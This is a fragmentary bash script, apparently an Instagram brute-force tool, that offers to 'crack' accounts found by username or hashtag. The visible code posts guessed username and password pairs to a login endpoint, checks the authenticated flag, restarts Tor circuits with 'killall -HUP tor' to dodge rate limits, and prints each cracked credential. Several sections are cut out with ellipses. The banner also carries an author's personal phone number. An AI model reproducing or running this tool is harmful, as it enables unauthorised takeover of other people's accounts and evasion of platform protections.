# !/bin/bash
# Author 		: ./mr Shubhu
#contact.   :+ 91 9485875345
#Social media : Shubhushubhu99 (everywhere)
# Thanks to Lovehacker404
...
echo -e '''
      ...
      \e[1;37m__     | _|_ o |_)|
      \e[1;37m||||_| |  |_ | |_)|  
   \e[1;37m[\e[1;31m Contact \e[1;31m:\e[1;34m 9485875345\e[1;37m ]
    \e[1;37m[\e[1;31m Author \e[1;31m:\e[1;34m Guccifer Shubham\e[1;37m ]
1\e[1;31m. \e[1;37mGet \e[1;31m+ \e[1;37mcrack target from username \e[1;32m@shubhushubhu99\e[1;37m
2\e[1;31m. \e[1;37mGet \e[1;31m+ \e[1;37mcrack target from hashtag \e[1;32m@shubhushubhu99\e[1;37m
					...
					-d "username=${user}&password=${pass}") ; true_login=$(echo $login | jq -r '.authenticated')
  					if [[ $true_login =~ "true" ]]; then
						...
						killall -HUP tor
  						...
  						echo -e " ${white}[ ${yellow}Hack Insta${white} ]${red} ${white}- @${user}${red}:${white}${pass}"
  						killall -HUP tor
  					fi
}
...
if [[ $ask_again == "Y" || $ask_again == "y" ]]; then
	echo -e "${white}[ ${red}+${white} ] Okay good! lets try again boy "
	bash brute.sh
